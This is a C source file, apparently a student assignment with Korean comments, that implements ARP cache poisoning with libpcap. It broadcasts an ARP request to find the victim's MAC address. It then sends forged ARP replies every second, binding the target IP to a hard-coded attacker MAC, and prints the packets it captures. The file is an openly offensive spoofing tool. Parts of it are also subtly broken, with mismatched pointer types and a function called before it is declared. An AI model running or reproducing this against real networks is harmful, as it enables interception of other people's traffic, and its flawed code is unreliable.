#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <pcap/pcap.h>

#include <sys/types.h>
// #include<arpa/inet.h>
// #include<linux/if_arp.h>
#include <netinet/in.h>
#include <netinet/ether.h>

#include <pthread.h>

// #include <linux/if_arp.h>
// #include<net/ethernet.h>
// #include <net/if_arp.h>

typedef struct arp_hdr {
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
} arpHdr;

typedef struct fullarp {
    struct ethhdr eth_hdr;
    struct arp_hdr arp_hdr;
} fullarphdr;

typedef struct arpInfo {
    struct pcap_pkthdr header;
    pcap_t *handle;
    struct sockaddr_in sender;
    struct sockaddr_in target;
} arp_info;

void USARTWrite(const void *object, size_t size)
{
    const unsigned char *byte;
    int i = 0;
    for ( byte = object; size--; ++byte )
    {
        printf("%02X", *byte);
        i ++;
        if(i%16 == 0) {
            puts("");
        }
    }
    putchar('\n');
}

void *arpInfectionPlt(arp_info *arpInfo)    {
    printf("\nsender : %d \n", arpInfo -> sender.sin_addr);
    printf("\nntarget : %d \n", arpInfo -> target.sin_addr);
    arpInfection(arpInfo -> header, arpInfo -> handle, &(arpInfo -> sender), &(arpInfo -> target));
}

void arpInfection(struct pcap_pkthdr header, pcap_t **handle, struct sockaddr_in *sender, struct sockaddr_in *target)    {

    printf("\nsender : %d \n", sender -> sin_addr);
    printf("\nntarget : %d \n", target -> sin_addr);

    char *recvPacket;

    struct fullarp fullarp;

    memcpy(fullarp.eth_hdr.h_dest, "\xff\xff\xff\xff\xff\xff", 6); // 브로드케스트
    memcpy(fullarp.eth_hdr.h_source, "\xf4\x8c\x50\x8c\xda\xc0", 6); // 내 맥주소
    fullarp.eth_hdr.h_proto = htons(ETH_P_ARP);
    fullarp.arp_hdr.htype = htons(ARPHRD_ETHER);
    fullarp.arp_hdr.ptype = htons(0x0800);
    fullarp.arp_hdr.hlen = 6;
    fullarp.arp_hdr.plen = 4;
    fullarp.arp_hdr.oper = htons(ARPOP_REQUEST);
    memcpy(fullarp.arp_hdr.sha, "\xf4\x8c\x50\x8c\xda\xc0", 6); // 내 맥주소
    // fullarp.arp_hdr.spa = sender.sin_addr;
    memcpy(fullarp.arp_hdr.spa, &target -> sin_addr, 4); // 감염 데이터 ( target )
    memcpy(fullarp.arp_hdr.tha, "\x00\x00\x00\x00\x00\x00", 6);
    memcpy(fullarp.arp_hdr.tpa, &sender -> sin_addr, 4); // 공격 당하는 사람

    unsigned char* ptr;
    ptr = (unsigned char*)&fullarp;
    // *(ptr+sizeof(eth_hdr)) = (unsigned char*)&arp_hdr;
    USARTWrite(ptr, sizeof(fullarp));

    if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
    {
        printf("Error sending the packet: %s\n", pcap_geterr(handle));
        return;
    }

    char senderMac[7];

    int chk = 0;
    while(1) {
    	chk = pcap_next_ex(handle, &header, &recvPacket);
		if(chk != 1 ) continue;
        if(recvPacket[12] == 8 && recvPacket[13] == 6)    {
            if(recvPacket[20] == 0 && recvPacket[21] == 2) {
                memcpy(fullarp.eth_hdr.h_dest, recvPacket + 22, 6);
                break;
            }
        }
	}

    while(1) {
        if(pcap_sendpacket(handle, ptr, sizeof(fullarp)) != 0)
        {
            printf("Error sending the packet: %s\n", pcap_geterr(handle));
            return;
        }
        puts("ARP 감염 패킷 보냄");
        sleep(1);
    }
}

int main(int argc, char const *argv[]) {

    pcap_t *handle;					/* Session handle */
    char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
    struct bpf_program fp;			/* The compiled filter */
    struct pcap_pkthdr header;		/* The header that pcap gives us */
    bpf_u_int32 mask;				/* Our netmask */
    bpf_u_int32 net;				/* Our IP */
    u_char packet[100];			/* The actual packet */

    if(argc != 4)   {
        printf("\n\nUsage : %s [network] [Sender] [target]\n\n", argv[0]);
        return 2;
    }

    struct in_addr iaddr;

    const char* dev = argv[1];

    struct sockaddr_in sender;
    struct sockaddr_in target;

    inet_pton(AF_INET, argv[2], &(sender.sin_addr));
    inet_pton(AF_INET, argv[3], &(target.sin_addr));

  /* Error 제어 { */
    if(dev == NULL) { fprintf(stderr, "Couldn't find default device: %s\n", errbuf); return(2); }
    if(pcap_lookupnet(dev, &net, &mask, errbuf) == -1) { fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf); net = 0; mask = 0; }
    handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if(handle == NULL) { fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf); return(2); }
  /*}*/


    struct arpInfo arpInfo;
    arpInfo.header = header;
    arpInfo.handle = handle;
    arpInfo.sender = sender;
    arpInfo.target = target;

    printf("\nSender : %d\n", sender.sin_addr);
    printf("\nTarget : %d\n", target.sin_addr);

    pthread_t tid;
    pthread_create(&tid, NULL, arpInfectionPlt, &arpInfo);
    // pthread_join(tid, NULL);

    int chk = 0;
    char *recvPacket;

    while(1) {
    	chk = pcap_next_ex(handle, &header, &recvPacket);
		if(chk != 1 ) continue;
        USARTWrite(recvPacket, 60);
    }


    // How to Thread,,,?xl
    // pid_t pid;
    // struct pcap_pkthdr header;
    // pcap_t *handle;
    // struct sockaddr_in sender;
    // struct sockaddr_in target;

    // pthread_create(&tr, NULL, arpInfection, (void *)args);
    // arpInfection(header, handle, &sender.sin_addr, &target.sin_addr);

    return 0;
}
